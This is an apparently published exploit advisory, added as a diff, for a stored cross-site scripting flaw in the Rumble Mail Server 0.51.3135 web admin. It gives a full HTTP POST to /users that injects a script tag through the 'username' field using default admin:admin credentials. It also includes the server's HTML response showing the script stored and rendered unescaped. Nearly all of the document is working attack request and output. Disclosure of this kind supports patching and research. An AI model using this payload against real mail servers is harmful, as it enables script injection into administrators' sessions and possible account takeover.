@@ -1,0 +1,146 @@
+# Exploit Title: Rumble Mail Server 0.51.3135 - 'username' Stored XSS
+# Date: 2020-9-3
+# Exploit Author: Mohammed Alshehri
+# Vendor Homepage: http://rumble.sf.net/
+# Software Link:  https://sourceforge.net/projects/rumble/files/Windows%20binaries/rumble_0.51.3135-setup.exe
+# Version: Version 0.51.3135
+# Tested on: Microsoft Windows 10 Education - 10.0.17763 N/A Build 17763
+
+# Exploit:
+POST /users HTTP/1.1
+Host: 127.0.0.1:2580
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Origin: http://127.0.0.1:2580
+Authorization: Basic YWRtaW46YWRtaW4=
+Connection: keep-alive
+Referer: http://127.0.0.1:2580/users
+Upgrade-Insecure-Requests: 1
+
+username=%3Cscript%3Ealert%28%22M507%22%29%3C%2Fscript%3E&password=admin&rights=*&submit=Submit
+HTTP/1.1 200 OK
+Connection: close
+Content-Type: text/html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" href="/favicon.ico " />
+<title>RumbleLua</title>
+<link href="rumblelua2.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+<div class="header_top">
+  <div class="header_stuff">
+    RumbleLua on a.com<br />
+    <span class="fineprint">Rumble Mail Server v/0.51.3135 <br />
+    </span>
+
+<a href="/"><img src="/icons/computer.png" align="absmiddle" /> Server status</a>
+<a href="/domains"><img src="/icons/house.png" align="absmiddle" /> Domains & accounts</a>
+
+<a href="/users"><img src="/icons/group.png" align="absmiddle" /> RumbleLua users</a>
+<a href="/settings"><img src="/icons/report_edit.png" align="absmiddle" /> Server settings</a>
+<a href="/modules"><img src="/icons/plugin_edit.png" align="absmiddle" /> Set up modules</a>
+<a href="/systeminfo"><img src="/icons/page_white_find.png" align="absmiddle" /> System logs</a>
+<a href="/queue"><img src="/icons/clock.png" align="absmiddle" /> Mail queue</a>
+
+</div>
+</div>
+<div id="contents">
+
+
+<h1>RumbleLua users </h1>
+<p>This page allows you to create, modify or delete accounts on the RumbleLua system.<br />
+Users with <img src="../icons/action_lock.png" alt="lock" width="24" height="24" align="absmiddle" /><span style="color:#C33; font-weight:bold;"> Full control</span> can add, edit and delete domains as well as change server settings, <br />
+while regular users can only
+see and edit the domains they have access to.
+</p>
+<table class="elements">
+  <tr>
+    <th>Create a new user:</th>
+  </tr>
+<tr>
+<td>
+<form action="/users" method="post" name="makeuser">
+
+  <div style="width: 300px; text-align:right; float: left;">
+    <label for="username"><strong>Username:</strong></label>
+    <input name="username" autocomplete="off" type="text" id="username" >
+    <br>
+    <label for="password"><strong>Password:</strong></label>
+    <input type="password" autocomplete="off" name="password" id="password">
+    <br />
+    <label for="password"><strong>Access rights:</strong></label>
+    <select name="rights" size="4" style="width: 150px;" multiple="multiple">
+    <option value="*" style="color:#C33; font-weight:bold;">Full control</option>
+    <optgroup label="Domains:">
+        </optgroup>
+    </select>
+      </div>
+    <p><br /><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+
+      &nbsp;&nbsp;
+      <input type="submit" name="submit" id="submit" value="Submit" />
+    </p>
+
+</form>
+</td>
+</tr>
+</table>
+<table width="200" class="elements">
+  <tr>
+    <th>Username</th>
+    <th>Rights</th>
+    <th>Actions</th>
+  </tr>
+  <tr>
+    <td><img src="/icons/action_lock.png" align="absmiddle"/>&nbsp;<strong><font color='#006600'><script>alert("M507")</script></font></strong></td>
+    <td>Full control</td>
+    <td>
+	<a href="/users?user=<script>alert("M507")</script>&edit=true"><img src="/icons/action_edit.png" title="Edit" align="absmiddle"/></a>&nbsp;
+	<a href="/users?user=<script>alert("M507")</script>&delete=true"><img src="/icons/action_delete.png" title="Delete" align="absmiddle"/></a>
+	</td>
+  </tr>
+    <tr>
+    <td><img src="/icons/action_lock.png" align="absmiddle"/>&nbsp;<strong><font color='#006600'>admin</font></strong></td>
+    <td>Full control</td>
+    <td>
+	<a href="/users?user=admin&edit=true"><img src="/icons/action_edit.png" title="Edit" align="absmiddle"/></a>&nbsp;
+	<a href="/users?user=admin&delete=true"><img src="/icons/action_delete.png" title="Delete" align="absmiddle"/></a>
+	</td>
+  </tr>
+    <tr>
+    <td><img src="/icons/action_lock.png" align="absmiddle"/>&nbsp;<strong><font color='#006600'><script>alert("M5072")</script></font></strong></td>
+    <td>Full control</td>
+    <td>
+	<a href="/users?user=<script>alert("XSS")</script>&edit=true"><img src="/icons/action_edit.png" title="Edit" align="absmiddle"/></a>&nbsp;
+	<a href="/users?user=<script>alert("XSS")</script>&delete=true"><img src="/icons/action_delete.png" title="Delete" align="absmiddle"/></a>
+	</td>
+  </tr>
+  </table>
+<p>&nbsp;</p>
+
+
+</div>
+<br />
+<p align="center">
+Powered by Rumble Mail Server - [<a href="https://sourceforge.net/p/rumble/wiki/Home/">wiki</a>] [<a href="https://sourceforge.net/projects/rumble/">project home</a>]
+</p>
+</body>
+
+
+</html>
